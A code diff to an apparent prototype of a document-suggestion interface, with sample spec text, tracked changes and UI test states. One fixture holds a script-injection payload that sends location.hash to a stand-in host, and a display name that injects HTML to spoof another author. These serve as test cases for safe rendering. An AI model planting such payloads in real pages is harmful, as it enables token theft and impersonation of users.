@@ -187,7 +187,6 @@ button { font: inherit; }
 .prose th { background: var(--surface); font-weight: 600; }
 [data-root] { outline: none; }
 .is-suggesting [data-root][contenteditable="true"] { cursor: text; caret-color: var(--patina); }
-.is-suggesting [data-ro] { cursor: not-allowed; }
 [data-block].is-drafting { outline: 1px dashed color-mix(in srgb, var(--patina) 70%, transparent); outline-offset: 5px; }
 [data-block].is-mirror { outline: 1px dotted var(--rule-strong); outline-offset: 4px; }
 
@@ -412,8 +411,6 @@ function icon(name) {
 const enc = new TextEncoder();
 const bytes = (s) => enc.encode(s).length;
 const nfmt = (n) => n.toLocaleString('en-US');
-const escHtml = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-const escJsx = (s) => escHtml(s).replace(/\{/g, '&#123;').replace(/\}/g, '&#125;');
 const count = (s, c) => s.split(c).length - 1;
 const noFocus = (e) => e.preventDefault();
 
@@ -423,19 +420,30 @@ const PEOPLE = {
   priya: { name: 'Priya Raman', email: 'priya@larkspur.dev', color: 1 },
   marcus: { name: 'Marcus Ohene', email: 'marcus.ohene@larkspur.dev', color: 3 },
   lena: { name: 'Lena Brandt', email: 'lena@brandt-field.co', color: 2 },
+  sam: { name: 'Sam Kepler', email: 'sam.kepler@outlook.com', color: 2 },
   dana: { name: 'Dana Whitfield', email: 'dana@larkspur.dev', color: 4 },
 };
 const first = (k) => PEOPLE[k].name.split(' ')[0];
 
-const T = (text, fmt, extra) => ({ t: 'text', text, fmt: fmt || null, ro: null, ...(extra || {}) });
+const T = (text, fmt, extra) => ({ t: 'text', text, fmt: fmt || null, ...(extra || {}) });
 const C = (id, fmt) => ({ t: 'chg', id, fmt: fmt || null });
 const B = (id, tag, runs, extra) => ({ id, tag, runs, ...(extra || {}) });
 
 const P5 = 'When the same form is edited on two devices before either one syncs, the server keeps both copies and marks the form as split. The crew lead sees the two versions side by side, with every field that differs highlighted, and picks one value per field. Nothing is merged automatically, because an inspection result that changes without anyone noticing is worse than one that asks a question. A split form blocks the end-of-day report until the lead resolves it. The report screen lists every split form by site and inspector, so none of them waits overnight unseen.';
+/* The same warning sits under two sections of the source, so a short edit inside it matches
+   twice even with its context (plan 3.2.6, state S6h). */
+const CALLOUT = 'Forms saved offline live only on the device until the server confirms them. Do not clear the app\u2019s data, reinstall the app or sign out while the queue banner shows forms waiting: any of those deletes the waiting forms, and nothing on the server can bring them back. Ask the crew lead to check the queue before a device changes hands.';
+/* A hostile replacement (R5). The closing tag is split so the page's own script block does not end here. */
+const HOSTILE = '<script>fetch("https://x.example/?k="+location.hash)<' + '/script> **Read this first:** devices disagree';
 
 function docMD() {
   return {
     cls: 'md', filename: 'offline-sync-spec.md', accession: 'K7R2WQ9X4MT1HZ8V', marker: 'Text, no author code',
+    containers: {
+      tscroll: { tag: 'div', cls: 'md-scroll' }, table: { tag: 'table', parent: 'tscroll' },
+      thead: { tag: 'thead', parent: 'table' }, tbody: { tag: 'tbody', parent: 'table' },
+      tr0: { tag: 'tr', parent: 'thead' }, tr1: { tag: 'tr', parent: 'tbody' }, tr2: { tag: 'tr', parent: 'tbody' }, tr3: { tag: 'tr', parent: 'tbody' },
+    },
     blocks: [
       B('h1', 'h1', [T('Offline sync for field crews')]),
       B('p1', 'p', [T('Field crews lose signal for '), C('c-shift'), T('. Today the app discards any form that fails to upload, and the crew re-enters it from paper that evening. This spec makes every form save on the device first and sync when a connection returns.')]),
@@ -443,31 +451,46 @@ function docMD() {
       B('p2', 'p', [T('The first release covers '), C('c-forms'), T(' and photo attachments. Signatures and map edits stay online-only until '), C('c-version', 'strong'), T(', because their conflict rules are not settled.')]),
       B('li1', 'li', [T('Forms save to the device within '), C('c-200'), T(' of the last keystroke.')], { list: 'u1' }),
       B('li2', 'li', [T('Photos queue at full resolution and upload '), C('c-mine'), T(', unless the crew lead overrides it.')], { list: 'u1' }),
-      B('li3', 'li', [T('A form edited on two devices keeps both copies and asks the lead to choose.')], { list: 'u1' }),
+      B('li3', 'li', [T('A form edited on two devices keeps both copies'), C('c-del'), T(' and asks the lead to choose.')], { list: 'u1' }),
+      B('q1', 'blockquote', [T(CALLOUT)], { repeats: true }),
       B('h2b', 'h2', [T('Sync rules')]),
       B('p3', 'p', [T('The device retries '), C('g-retry'), T(' while it has a connection, backing off to every 10 minutes after five failures. A banner shows how many forms are waiting, and tapping it opens the queue.')]),
-      B('p4', 'p', [T('Nothing leaves the queue until the server confirms it by '), C('c-sha'), T('. See the '), T('upload contract', 'a'), T(' for the exact response.')]),
-      B('h2c', 'h2', [T('When two devices disagree')]),
+      B('t0a', 'th', [T('After a failed upload')], { in: 'tr0' }),
+      B('t0b', 'th', [T('The device waits')], { in: 'tr0' }),
+      B('t1a', 'td', [T('1st to 5th failure')], { in: 'tr1' }),
+      B('t1b', 'td', [T('30 seconds')], { in: 'tr1' }),
+      B('t2a', 'td', [T('6th failure onward')], { in: 'tr2' }),
+      B('t2b', 'td', [T('10 minutes')], { in: 'tr2' }),
+      B('t3a', 'td', [T('Signal returns')], { in: 'tr3' }),
+      B('t3b', 'td', [T('Retries at once')], { in: 'tr3' }),
+      B('p4', 'p', [T('Nothing leaves the queue until the server confirms it by checksum. See the '), T('upload contract', 'a'), T(' for the exact response'), C('c-link'), T('.')]),
+      B('h2c', 'h2', [C('c-hostile')]),
       B('p5', 'p', [T(P5)]),
+      B('q2', 'blockquote', [T(CALLOUT)], { repeats: true }),
     ],
     changes: {
       'c-shift': { author: 'priya', block: 'p1', del: 'hours at a time', ins: 'most of a shift', time: '14 min ago', replies: [
         { who: 'dana', time: '9 min ago', body: 'Crews in the valley lose it for whole days. Is "most of a shift" too soft?' },
         { who: 'priya', time: '6 min ago', body: 'Shifts are the common case. I would keep this and add a line about multi-day gaps.' }] },
-      'c-version': { author: 'lena', block: 'p2', del: 'version 3.2', ins: 'version 3.3', fmt: 'strong', source: ['**version 3.2**', '**version 3.3**'], time: '1 hr ago', replies: [
+      'c-version': { author: 'lena', display: 'Lena (field ops)', block: 'p2', del: 'version 3.2', ins: 'version 3.3', fmt: 'strong', source: ['**version 3.2**', '**version 3.3**'], time: '1 hr ago', replies: [
         { who: 'priya', time: '40 min ago', body: 'Signatures slipped to 3.3 in Tuesday\u2019s planning notes, so this matches.' }] },
       'c-200': { author: 'priya', also: ['marcus'], block: 'li1', del: '200 ms', ins: '500 ms', time: '32 min ago', replies: [
         { who: 'marcus', time: '20 min ago', body: 'Same number I got from the battery test on the Tab A8, so I suggested it too.' }] },
       'c-mine': { author: 'you', block: 'li2', del: 'over Wi-Fi only', ins: 'over Wi-Fi or unmetered cellular', time: '3 min ago', replies: [] },
+      'c-del': { author: 'lena', block: 'li3', del: ', flags the form in red,', ins: '', time: '48 min ago', replies: [
+        { who: 'priya', time: '35 min ago', body: 'Agreed. Red alone fails for colour-blind leads, and the split icon already says it.' }] },
+      'c-link': { author: 'marcus', block: 'p4', del: '', ins: ' and the [error codes](https://larkspur.dev/specs/upload#errors)', exact: 'e', mode: 'after',
+        source: ['', ' and the [error codes](https://larkspur.dev/specs/upload#errors)'], applied: [' and the ', { a: 'error codes' }], time: '27 min ago', replies: [] },
       'c-15': { author: 'priya', group: 'g-retry', block: 'p3', del: 'every 30 seconds', ins: 'every 15 seconds', time: '50 min ago', replies: [
         { who: 'dana', time: '31 min ago', body: '15 s doubles the radio wake-ups. Do we have a battery number for it?' }] },
       'c-60': { author: 'marcus', group: 'g-retry', block: 'p3', del: 'every 30 seconds', ins: 'every minute', time: '44 min ago', replies: [] },
       'c-5s': { author: 'lena', group: 'g-retry', block: 'p3', del: 'every 30 seconds', ins: 'every 30 seconds, starting 5 seconds after the signal returns', time: '25 min ago', replies: [] },
       'c-forms': { author: 'priya', block: 'p2', del: 'inspection forms', ins: 'inspection and incident forms', time: 'just now', replies: [] },
-      'c-sha': { author: 'marcus', block: 'p4', del: 'checksum', ins: 'SHA-256 checksum', time: 'just now', replies: [] },
+      'c-hostile': { author: 'sam', display: '</span><b>Dana</b>', block: 'h2c', del: 'When two devices disagree', ins: HOSTILE,
+        source: ['When two devices disagree', HOSTILE], time: '2 min ago', replies: [] },
     },
-    groups: { 'g-retry': { block: 'p3', del: 'every 30 seconds', members: ['c-15', 'c-60', 'c-5s'], default: 'c-15', chosen: null } },
-    active: ['c-shift', 'c-version', 'c-200', 'c-mine', 'g-retry'],
+    groups: { 'g-retry': { block: 'p3', del: 'every 30 seconds', members: ['c-15', 'c-60', 'c-5s'], default: 'c-15' } },
+    active: ['c-shift', 'c-version', 'c-200', 'c-mine', 'c-del', 'g-retry', 'c-link'],
   };
 }
 
@@ -498,106 +521,84 @@ function docCode() {
     groups: {}, active: ['k-15'],
   };
 }
+const DOCS = { md: docMD, code: docCode };
 
-function docHTML() {
-  return {
-    cls: 'html', filename: 'field-day.html', accession: 'H9PL3VE6RQ2ND8MW', marker: 'Runs author code, sandboxed',
-    pageClass: 'fp',
-    containers: { hero: { tag: 'header', cls: 'fp-hero' }, main: { tag: 'section', cls: 'fp-main' }, sessions: { tag: 'ol', cls: 'fp-sessions', parent: 'main' }, cta: { tag: 'div', cls: 'fp-cta', parent: 'main' } },
-    blocks: [
-      B('f-kicker', 'p', [T('Larkspur Field Ops \u00b7 Spring session')], { in: 'hero', cls: 'fp-kicker' }),
-      B('f-h1', 'h1', [T('Field Day at the Tamarack yard')], { in: 'hero' }),
-      B('f-count', 'p', [T('Starts in 12 days', null, { ro: 'script' })], { in: 'hero', cls: 'fp-count' }),
-      B('f-lede', 'p', [T('Bring your crew on Saturday, May 15 for hands-on time with the new offline forms. '), C('h-coffee'), T(' from 8:30; sessions run until 2:00.')], { in: 'main', cls: 'fp-lede' }),
-      B('f-h2', 'h2', [T('Sessions')], { in: 'main' }),
-      B('f-s1', 'li', [T('9:00 \u00b7 Setting up a device for offline use')], { in: 'sessions' }),
-      B('f-s2', 'li', [T('10:30 \u00b7 Photos, queues & weak signal')], { in: 'sessions' }),
-      B('f-s3', 'li', [T('1:00 \u00b7 Resolving a form edited on two devices')], { in: 'sessions' }),
-      B('f-cta', 'p', [T('Reserve a seat')], { in: 'cta', cls: 'fp-button' }),
-      B('f-foot', 'p', [T('Questions go to Dana Whitfield at the Tamarack office, 1140 Sawmill Road.')], { in: 'main', cls: 'fp-small' }),
-    ],
-    changes: {
-      'h-coffee': { author: 'priya', block: 'f-lede', del: 'Coffee', ins: 'Coffee and breakfast', time: '18 min ago', replies: [] },
-    },
-    groups: {}, active: ['h-coffee'],
-  };
+/* Outcomes on the version 1 page once version 2 has landed (plan 3.3). Every state but
+   pending (current version only) and deleted (gone). */
+const OUTCOMES = {
+  'c-shift': { badge: 'Accepted in v2', tone: 'ok', chip: 'accepted in v2', note: 'Applied. Multi-day gaps get their own section next.' },
+  'c-60': { badge: 'Accepted in v2', tone: 'ok', chip: 'accepted in v2', note: 'A minute keeps the radio quiet, and the battery run backs it.' },
+  'c-15': { badge: 'Superseded', tone: 'quiet', chip: 'superseded', note: 'Marcus\u2019s \u201cevery minute\u201d shipped in version 2 instead.' },
+  'c-5s': { badge: 'Seen by the publisher, not applied yet', tone: 'wait', chip: 'seen', note: 'Worth doing once the radio driver reports signal changes.' },
+  'c-version': { badge: 'Not taken', tone: 'quiet', chip: 'not taken', note: 'Signatures still go offline in 3.2. Keeping it.' },
+  'c-200': { badge: 'The publisher replied', tone: 'wait', chip: 'replied', note: 'Is 500 ms from the Tab A8 run or the Pixel? I will decide after both.' },
+  'c-mine': { badge: 'No answer from the publisher is visible to you', tone: 'soft', chip: 'no answer', note: null },
+  'c-del': { badge: 'Withdrawn', tone: 'quiet', chip: 'withdrawn', note: null },
+  'c-link': { badge: 'Closed by the publisher', tone: 'quiet', chip: 'closed', note: null },
+};
+/* Version 2 carries the two accepted suggestions in its source and starts with none. */
+function bakeV2(v) {
+  const baked = { 'c-shift': 'most of a shift', 'g-retry': 'every minute' };
+  for (const b of v.doc.blocks) b.runs = b.runs.map((r) => (r.t === 'chg' && baked[r.id] ? T(baked[r.id], r.fmt) : r));
 }
 
-function docJSX() {
-  const cards = [['Solo', '$9'], ['Crew', '$18'], ['Depot', '$42']];
-  const blocks = [
-    B('j-h', 'h2', [T('Plans for crews of every size')], { cls: 'jx-title' }),
-    B('j-sub', 'p', [T('Every plan includes offline forms and photo queues.')], { cls: 'jx-sub' }),
-  ];
-  const containers = { grid: { tag: 'div', cls: 'jx-grid' } };
-  cards.forEach(([name, price], i) => {
-    const k = 'card' + (i + 1);
-    containers[k] = { tag: 'div', cls: 'jx-card', parent: 'grid' };
-    blocks.push(B('j-name-' + (i + 1), 'h3', [T(name)], { in: k }));
-    blocks.push(B('j-price-' + (i + 1), 'p', [T(price, null, { ro: 'expr' }), T(' per device, per month')], { in: k, cls: 'jx-price' }));
-    blocks.push(B('j-foot-' + (i + 1), 'p', [T('Cancel any time from the Billing page.')], { in: k, cls: 'jx-foot', twin: 'foot' }));
-  });
-  return { cls: 'jsx', filename: 'PricingCard.jsx', accession: 'J2WD7KM4QX9TB6NE', marker: 'Runs author code, sandboxed', pageClass: 'jx', containers, blocks, changes: {}, groups: {}, active: [] };
-}
-const DOCS = { md: docMD, code: docCode, html: docHTML, jsx: docJSX };
+const UNAVAILABLE = {
+  older: 'Suggestions can only be made on the current version.',
+  too_large: 'Suggesting is off: this file is 1.4 MiB, and suggestions work on files up to 1 MiB.',
+  has_cr: 'Suggesting is off: this file contains carriage returns (CR) or NUL characters, which a suggestion can\u2019t point at.',
+  not_utf8: 'Suggesting is off: this file is not valid UTF-8.',
+  layout: 'This document\u2019s layout could not be matched to its source.',
+};
+const PASTED_LOG = Array.from({ length: 24 }, (_, i) => `Day ${i + 1}, Tamarack yard, ${['Tab A8', 'Pixel 7', 'iPad 9'][i % 3]}: ${12 + i * 3} forms queued offline, all confirmed by checksum on reconnect.`).join('\n');
 
-const OUTCOMES = [
-  { who: 'priya', del: 'hours at a time', ins: 'most of a shift', badge: 'Accepted in v3', tone: 'ok', note: { who: 'dana', body: 'Applied. Multi-day gaps get their own section in v4.' } },
-  { who: 'marcus', del: '200 ms', ins: '500 ms', badge: 'Superseded', tone: 'soft', note: { who: 'dana', body: 'Priya suggested the same number first; v3 carries hers.' }, sub: 'Another suggestion on this text was applied instead.' },
-  { who: 'lena', del: 'version 3.2', ins: 'version 3.3', badge: 'Not taken', tone: 'soft', note: { who: 'dana', body: 'Signatures still go offline in 3.2. Keeping it.' } },
-  { who: 'priya', del: 'every 30 seconds', ins: 'every 15 seconds', badge: 'Outdated', tone: 'soft', note: null, sub: 'Version 3 rewrote this sentence, so the suggestion no longer matches the text.' },
-  { who: 'you', del: 'over Wi-Fi only', ins: 'over Wi-Fi or unmetered cellular', badge: 'Seen by the publisher, not applied yet', tone: 'wait', note: { who: 'dana', body: 'Needs a data-cost check with the carrier first.' } },
-  { who: 'marcus', del: 'every 30 seconds', ins: 'every 45 seconds', badge: 'Changed after the publisher answered', tone: 'warn', note: { who: 'dana', body: 'Not taken: a minute is too slow for the queue banner.' }, sub: 'Marcus changed "every minute" to "every 45 seconds" after this answer.' },
-];
-
-const UNSENT = [
-  { block: 'p3', where: 'Sync rules', del: 'tapping it opens the queue', ins: 'tapping it opens the list of waiting forms', why: 'The page closed while this device was offline.' },
-  { block: 'p4', where: 'Sync rules', del: 'the queue', ins: 'the outbox', why: 'This passage repeats in the source. Select a longer passage.', repeats: true },
-];
-
-/* ---------------- states (plan.md section 7) ---------------- */
+/* ---------------- states (plan.md section 3.6) ---------------- */
 const STATES = [];
 function S(key, group, title, cfg) { STATES.push({ key, id: cfg.label || key, group, title, ...cfg }); }
 const MD_PEERS_S1 = [{ who: 'priya', block: 'p1', off: 52 }, { who: 'marcus', block: 'li3', off: 36 }];
 const MD_PEERS_P1 = [{ who: 'priya', block: 'p2', off: 38, typing: { s: 25, e: 41 } }, { who: 'marcus', block: 'li3', off: 36 }];
+const seedS2 = () => { const s2 = P5.indexOf('The crew lead'); seedDraft({ block: 'p5', from: s2, to: P5.length, ins: 'The lead picks one value per field. Nothing merges on its own, and the end-of-day report waits until every split form is resolved.' }); };
 
-S('R1', 'Reading', 'Tracked changes inline: a single replace, an identical pair (\u00d72, also suggested by), a conflict group of three showing its default member with badge 3', {});
-S('R1-dark', 'Reading', 'R1 in dark mode', { label: 'R1', theme: 'dark' });
-S('R2', 'Reading', 'Hovering a change opens its card: verified address and name, struck and inserted text, Source line (markup), status, replies, reply box', { after: () => openCardAt('c-version', { via: 'hover' }) });
-S('R3', 'Reading', 'Conflict card with radio choices; the choice changes only this reader\u2019s applied view', { after: () => openCardAt('g-retry', { pinned: true }) });
-S('R4', 'Reading', 'Your own pending suggestion, styled as yours (dashed), with its card', { after: () => openCardAt('c-mine', { pinned: true }) });
-S('A1', 'Applied', '\u201cShow suggestions applied\u201d: clean text, edited stretches faintly marked', { applied: true });
-S('A2', 'Applied', 'Selecting edited text offers Reply and Copy; Comment and Suggest are absent, with a one-line reason', { applied: true, after: () => { selectInBlock('p1', 'most of a shift'); selectionOffer(); } });
-S('S1', 'Suggesting', 'Suggesting on: the mode chip, your caret in the text, two peer carets with name flags. Click any paragraph and type.', { mode: 'suggesting', peers: MD_PEERS_S1, after: () => placeCaret('p3', 112) });
-S('S2', 'Suggesting', 'Typing inline: struck and inserted draft, the hint \u201cEsc cancels \u00b7 Leave the paragraph to post\u201d, counters near the struck limit', { mode: 'suggesting', after: () => { const s2 = P5.indexOf('The crew lead'); seedDraft({ block: 'p5', from: s2, to: P5.length, ins: 'The lead picks one value per field. Nothing merges on its own, and the end-of-day report waits until every split form is resolved.' }); } });
-S('S2-dark', 'Suggesting', 'S2 in dark mode', { label: 'S2', theme: 'dark', mode: 'suggesting', after: () => { const s2 = P5.indexOf('The crew lead'); seedDraft({ block: 'p5', from: s2, to: P5.length, ins: 'The lead picks one value per field. Nothing merges on its own, and the end-of-day report waits until every split form is resolved.' }); } });
-S('S3', 'Suggesting', 'Reading-mode selection offer: Copy text, Comment, Suggest edit', { after: () => { selectInBlock('p3', 'A banner shows how many forms are waiting'); selectionOffer(); } });
-S('S4', 'Suggesting', 'Receipt after leaving the paragraph: \u201cSuggestion posted\u201d, the exact text, Undo', { mode: 'suggesting', after: () => { seedDraft({ block: 'p4', find: 'the server confirms it', ins: 'the server confirms each form' }); commit('left'); } });
-S('S5', 'Suggesting', '\u201cEditing your suggestion\u201d: typing into your own pending suggestion coalesces into one edit (PATCH), not a second suggestion', { mode: 'suggesting', after: () => seedDraft({ block: 'li2', editing: 'c-mine', ins: 'over Wi-Fi or unmetered cellular, never while roaming' }) });
-S('S6a', 'Suggesting', 'Refusal: typing inside someone else\u2019s inserted text', { label: 'S6a', mode: 'suggesting', after: () => { caretInChange('c-shift', 5); synthInput('insertText', 'x', true); } });
-S('S6b', 'Suggesting', 'Refusal: a selection that crosses formatting (into bold)', { label: 'S6b', mode: 'suggesting', active: ['c-shift', 'c-200', 'c-mine', 'g-retry'], after: () => { selectAcross('p2', 'online-only until', 'version'); synthInput('insertText', 'x', true); } });
-S('S6c', 'Suggesting', 'Refusal: striking more than 512 bytes', { label: 'S6c', mode: 'suggesting', after: () => { scrollBlockTo('p5', 0.15); selectInBlock('p5', P5); synthInput('insertText', 'x', true); } });
-S('S6d', 'Suggesting', 'Refusal: a selection across paragraphs', { label: 'S6d', mode: 'suggesting', after: () => { selectBetween('p3', 'opens the queue.', 'p4', 'Nothing leaves'); synthInput('insertText', 'x', true); } });
-S('S7', 'Suggesting', 'A conflicting remote change lands mid-draft and folds into a badge on the draft', { mode: 'suggesting', peers: [{ who: 'marcus', block: 'p4', off: 78 }], after: () => { seedDraft({ block: 'p4', find: 'confirms it by checksum', ins: 'confirms receipt by checksum' }); remoteArrive('c-sha', 'Marcus posted a suggestion in the paragraph you are editing'); } });
-S('S8', 'Suggesting', 'Signed out: Suggesting leads to sign-in', { signedIn: false, after: () => openSignIn() });
-S('P1', 'Presence and recovery', 'A peer\u2019s view while Priya types: \u201cPriya is suggesting\u2026\u201d on the passage plus her caret, never her text', { peers: MD_PEERS_P1 });
-S('P1-dark', 'Presence and recovery', 'P1 in dark mode', { label: 'P1', theme: 'dark', peers: MD_PEERS_P1 });
-S('P2', 'Presence and recovery', 'The same view after Priya leaves the paragraph: her change appears inline', { peers: [{ who: 'priya', block: 'h2b', off: 4 }, { who: 'marcus', block: 'li3', off: 36 }], after: () => remoteArrive('c-forms', 'Priya posted a suggestion \u00b7 just now') });
-S('P3', 'Presence and recovery', 'The \u201cLive presence unavailable\u201d chip', { presence: 'off', mode: 'suggesting', after: () => placeCaret('p3', 112) });
-S('U1', 'Presence and recovery', 'The Unsent tray with Retry and Discard', { unsent: true });
-S('O1', 'Presence and recovery', 'The six outcome states after a republish (version 3)', { outcomes: true, sidebar: true, version: 3, active: [], setup: (v) => { v.changes['c-shift'].del = 'most of a shift'; } });
-S('C1', 'Code, HTML, JSX', 'A multi-line code draft using Enter and Tab', { cls: 'code', mode: 'suggesting', after: () => seedDraft({ block: 'file', find: 'failures += 1;', after: true, ins: '\n\t\t\tif (failures === 5) notifyLead(form.id);' }) });
-S('C2', 'Code, HTML, JSX', 'The code applied view', { cls: 'code', applied: true });
-S('H1', 'Code, HTML, JSX', 'Typing in an HTML page: the receipt in Relic\u2019s chrome, outside the page, with the first-time notice that the page\u2019s scripts can see typing', { cls: 'html', mode: 'suggesting', after: () => { seedDraft({ block: 'f-s2', find: 'queues & weak signal', ins: 'queues & no signal' }); commit('left'); } });
-S('H1-dark', 'Code, HTML, JSX', 'H1 in dark mode', { label: 'H1', theme: 'dark', cls: 'html', mode: 'suggesting', after: () => { seedDraft({ block: 'f-s2', find: 'queues & weak signal', ins: 'queues & no signal' }); commit('left'); } });
-S('H2', 'Code, HTML, JSX', 'Refusal for script-generated text', { cls: 'html', mode: 'suggesting', after: () => { placeCaret('f-count', 10); synthInput('insertText', 'x', true); } });
-S('H3', 'Code, HTML, JSX', 'The HTML applied view (second frame)', { cls: 'html', applied: true });
-S('J1', 'Code, HTML, JSX', 'Refusal for expression text: \u201cThis text comes from code, not the page\u2019s source text.\u201d', { cls: 'jsx', mode: 'suggesting', after: () => { placeCaret('j-price-2', 2); synthInput('insertText', 'x', true); } });
-S('J2', 'Code, HTML, JSX', '\u201cThis text appears 3 times; your suggestion changes all of them.\u201d', { cls: 'jsx', mode: 'suggesting', after: () => seedDraft({ block: 'j-foot-2', find: 'from the Billing page', ins: 'from Settings, then Billing' }) });
-S('N1', 'Narrow and legacy', '390\u00d7844: Suggesting with the receipt shown, above the keyboard', { frame: '390', keyboard: true, mode: 'suggesting', after: () => { seedDraft({ block: 'p3', find: 'tapping it opens the queue', ins: 'tapping it opens the waiting forms' }); commit('left'); placeCaret('p3', 40); scrollBlockTo('p3', 0.08); } });
-S('N2', 'Narrow and legacy', '320\u00d7480: the conflict card', { frame: '320', after: () => { scrollBlockTo('p3', 0.02); openCardAt('g-retry', { pinned: true }); } });
-S('N3', 'Narrow and legacy', '390\u00d7844: peer carets and the incoming indicator', { frame: '390', peers: MD_PEERS_P1 });
-S('L1', 'Narrow and legacy', 'An older viewer: each suggestion appears as a plain comment with its fallback body', { legacy: true, sidebar: true });
+S('R1', 'Reading', 'Tracked changes: a replace, a delete, an insertion, an identical pair marked \u201calso suggested by\u201d, and a three-member conflict with a 3 badge', { sidebar: true });
+S('R1-dark', 'Reading', 'R1 in dark mode', { label: 'R1', theme: 'dark', sidebar: true });
+S('R2', 'Reading', 'The card: address and display name, struck and inserted text shown literally, the Source line, the Suggested state, replies, Reply', { after: () => openCardAt('c-version', { via: 'hover' }) });
+S('R3', 'Reading', 'Conflict card listing all three members, \u201cThe applied view shows Priya\u2019s (posted first).\u201d No chooser', { after: () => openCardAt('g-retry', { pinned: true }) });
+S('R4', 'Reading', 'Your own pending suggestion, styled as yours, with Withdraw and Delete and no Edit', { after: () => openCardAt('c-mine', { pinned: true }) });
+S('R5', 'Reading', 'A hostile replacement containing <script> and ** markup, shown as literal text inline and in its card', { extra: ['c-hostile'], after: () => openCardAt('c-hostile', { pinned: true }) });
+S('A1', 'Applied', '\u201cShow suggestions applied\u201d: clean text with faint marks; the inserted link has no href, only its title', { applied: true, after: () => pinLinkNote() });
+S('A2', 'Applied', 'Selecting edited text offers Reply and Copy text; Comment and Suggest edit are absent, with one line saying why', { applied: true, after: () => { selectInBlock('p1', 'most of a shift'); selectionOffer(); } });
+S('S1', 'Suggesting', 'Suggesting on: the mode bar, your caret and the hint, with two peer carets. Click any paragraph and type.', { mode: 'suggesting', peers: MD_PEERS_S1, after: () => placeCaret('p3', 112) });
+S('S2', 'Suggesting', 'Typing: the draft, \u201cEsc cancels \u00b7 Leave the paragraph to post\u201d, and the counters near the struck limit', { mode: 'suggesting', after: seedS2 });
+S('S2-dark', 'Suggesting', 'S2 in dark mode', { label: 'S2', theme: 'dark', mode: 'suggesting', after: seedS2 });
+S('S3', 'Suggesting', 'The selection offer with Suggest edit', { after: () => { selectInBlock('p3', 'A banner shows how many forms are waiting'); selectionOffer(); } });
+S('S4', 'Suggesting', 'The receipt: \u201cSuggestion posted\u201d, the exact text, Undo', { mode: 'suggesting', after: () => { seedDraft({ block: 'p4', find: 'the server confirms it', ins: 'the server confirms each form' }); commit('left'); } });
+S('S5', 'Suggesting', '\u201cEditing your suggestion\u201d: typing into your own pending suggestion edits it (PATCH), not a second suggestion', { mode: 'suggesting', after: () => seedDraft({ block: 'li2', editing: 'c-mine', ins: 'over Wi-Fi or unmetered cellular, never while roaming' }) });
+S('S6a', 'Suggesting', 'Refused: typing inside someone else\u2019s insertion', { mode: 'suggesting', after: () => { caretInChange('c-shift', 5); synthInput('insertText', 'x', true); } });
+S('S6b', 'Suggesting', 'Refused: a selection across formatting (into bold)', { mode: 'suggesting', active: ['c-shift', 'c-200', 'c-mine', 'c-del', 'g-retry', 'c-link'], after: () => { selectAcross('p2', 'online-only until', 'version'); synthInput('insertText', 'x', true); } });
+S('S6c', 'Suggesting', 'Refused: a selection across paragraphs', { mode: 'suggesting', after: () => { selectBetween('li1', 'of the last keystroke.', 'li2', 'Photos queue'); synthInput('insertText', 'x', true); } });
+S('S6d', 'Suggesting', 'Refused: striking more than 512 bytes', { mode: 'suggesting', after: () => { scrollBlockTo('p5', 0.15); selectInBlock('p5', P5); synthInput('insertText', 'x', true); } });
+S('S6e', 'Suggesting', 'Refused: inserting more than 2,048 bytes (a pasted test log)', { mode: 'suggesting', after: () => { scrollBlockTo('p4', 0.3); placeCaret('p4', 62); synthInput('insertFromPaste', PASTED_LOG, true); } });
+S('S6f', 'Suggesting', 'Refused: a line break where none is allowed (Enter in a list item)', { mode: 'suggesting', after: () => { placeCaret('li1', 24); synthInput('insertParagraph', null, true); } });
+S('S6g', 'Suggesting', 'Refused: | typed in a table cell', { mode: 'suggesting', after: () => { scrollBlockTo('t1b', 0.35); placeCaret('t1b', 2); synthInput('insertText', '|', true); } });
+S('S6h', 'Suggesting', 'Refused on leaving: a passage that repeats in the source; the draft stays', { mode: 'suggesting', after: () => { scrollBlockTo('q1', 0.3); seedDraft({ block: 'q1', find: 'deletes the waiting forms', ins: 'erases the waiting forms' }); commit('left'); } });
+S('S7', 'Suggesting', '\u201cNot posted\u201d with Retry and Discard, and a note that leaving the page will ask first', { mode: 'suggesting', after: () => { seedDraft({ block: 'p1', find: 'from paper that evening', ins: 'from paper at the end of the shift' }); commit('left', { fail: true }); } });
+S('S8', 'Suggesting', 'Signed out: Suggest edit leads to sign-in', { signedIn: false, after: () => { selectInBlock('p3', 'tapping it opens the queue'); selectionOffer(); const b = V.offer && V.offer.querySelector('[data-suggest]'); if (b) b.click(); } });
+S('S9a', 'Suggesting', 'Suggesting unavailable: an older version', { version: 1, versions: 2, active: [], unavailable: 'older' });
+S('S9b', 'Suggesting', 'Suggesting unavailable: the file is over 1 MiB', { unavailable: 'too_large', setup: (v) => { v.doc.filename = 'field-ops-handbook.md'; v.doc.accession = 'M3QK9D2XW7RT4PZ1'; } });
+S('S9c', 'Suggesting', 'Suggesting unavailable: CR or NUL in the file', { cls: 'code', unavailable: 'has_cr' });
+S('S9d', 'Suggesting', 'Suggesting unavailable: the file is not UTF-8', { cls: 'code', unavailable: 'not_utf8', setup: (v) => { v.doc.filename = 'drain-queue.legacy.ts'; v.doc.accession = 'W8NP2KT6QD4XM9RE'; } });
+S('S9e', 'Suggesting', 'Suggesting unavailable: the layout could not be matched to the source', { unavailable: 'layout' });
+S('O1', 'Outcomes', 'The version 1 page after version 2 lands: every state from plan 3.3 on the changes and in the panel, read-only', { version: 1, versions: 2, outcomes: true, sidebar: true, unavailable: 'older' });
+S('O2', 'Outcomes', 'The version 2 page: clean, no version 1 suggestions, Suggesting available', { version: 2, versions: 2, active: [], setup: bakeV2 });
+S('C1', 'Code', 'A multi-line draft using Enter and Tab, with + rows in the gutter so numbering stays aligned', { cls: 'code', mode: 'suggesting', after: () => seedDraft({ block: 'file', find: 'failures += 1;', after: true, ins: '\n\t\t\tif (failures === 5) notifyLead(form.id);' }) });
+S('C2', 'Code', 'The code applied view', { cls: 'code', applied: true });
+S('N1', 'Small screens and old viewer', '390\u00d7844: Suggesting with the receipt showing, above the keyboard', { frame: '390', keyboard: true, mode: 'suggesting', after: () => { seedDraft({ block: 'p3', find: 'tapping it opens the queue', ins: 'tapping it opens the waiting forms' }); commit('left'); placeCaret('p3', 40); scrollBlockTo('p3', 0.08); } });
+S('N2', 'Small screens and old viewer', '320\u00d7480: the conflict card', { frame: '320', after: () => { scrollBlockTo('p3', 0.02); openCardAt('g-retry', { pinned: true }); } });
